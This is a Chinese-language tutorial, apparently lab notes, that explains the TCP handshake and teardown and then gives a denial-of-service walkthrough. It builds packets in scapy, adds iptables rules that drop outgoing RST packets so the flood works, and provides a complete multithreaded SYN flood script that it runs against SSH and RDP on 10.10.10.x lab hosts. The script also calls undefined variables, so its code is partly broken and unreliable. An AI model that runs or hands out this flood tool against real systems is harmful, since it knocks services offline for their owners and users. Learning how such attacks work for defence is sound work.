
# 拒绝服务--Syn-Flood攻击

* 简介

* syn 洪水攻击
* 脚本攻击
* 泛洪攻击常伴随 IP 地址欺骗
## 简介
* TCP 连接和端口过程
1. TCP建立连接
```
第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。

第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；

第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。

完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：

未连接队列
在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。

```
2. 关闭TCP连接
``` 
对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：

第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。

第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。

第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。

第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。
```    

* 两个序号和三个标志位
``` 
1. 序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。
2. 确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。
3. 标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：

    1. URG：紧急指针（urgent pointer）有效。
    2.ACK：确认序号有效。
    3. PSH：接收方应该尽快将这个报文交给应用层。
    4. RST：重置连接。
    5. SYN：发起一个新连接。
    6. FIN：释放一个连接。
```
* 需要注意的是
1. 不要将确认序号ack与标志位中的ACK搞混了。
1. 确认方ack=发起方req+1，两端配对。

``` 
在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，

因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；

第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。
```

* 四次挥手
``` 
由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，

收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN。

首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。

（1）第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。

（2）第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。

（3）第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。

（4）第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。
```

## syn 洪水攻击
* scapy 构造数据包
1. 构造 IP 数据包
``` 
>>> i=IP()
>>> i.display()

```
``` 
>>> i.dst="10.10.10.132"
>>> i.display()

```
2. 构造 TCP 数据包
``` 
>>> t=TCP()
>>> t.display()

```

``` 
>>> t.dport=22
>>> t.display()

```

* 发送数据包需要构造成 IP()/TCP() 形式：i/t
``` 

>>> sr1(i/t,verbose=1,timeout=2)
```

* 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
``` 
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP

iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP

```

## 脚本攻击
* 脚本攻击 linux 服务器
1. 代码
``` 
#!/usr/bin/python
#coding=utf-8

from scapy.all import*
from time import sleep
import thread
import random
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print "用法: ./syn_flood.py [IP地址] [端口] [线程数]"
    print "举例: ../syn_flood.py  1.1.1.1 80 20"
    sys.exit()

target = str(sys.argv[1])
port= int(sys.argv[2])
threads = int(sys.argv[3])

print"正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。"
def synflood(target,port):
    while 1:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
        sr1(i/t,verbose=1,timeout=2)

for x in range(0,threads):
    thread.start_new_thread(synflood,(target,port))

while 1:
  sleep(1)

```

2.  执行脚本
``` 
root@kali:~# python syn_flood.py 10.10.10.141 22 200
# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP

```

* 攻击 windows 机器
1. 测试可用性
``` 
root@kali:~# rdesktop 10.10.10.141

```   

2. 执行脚本
``` 
root@kali:~# python syn_flood.py 10.10.10.141 3389 10
# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP

root@kali:~# rdesktop 10.10.10.141

```   


* 泛洪攻击常伴随 IP 地址欺骗
``` 
伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3
    经常用于 DoS 攻击
    根据 IP 头地址寻址
        伪造IP源地址
    便捷路由器过滤源IP
        入站、出站
    受害者可能是源、目的地址
    绕过基于地址的验证
    压力测试模拟多用户
    上层协议（TCP序列号）
```


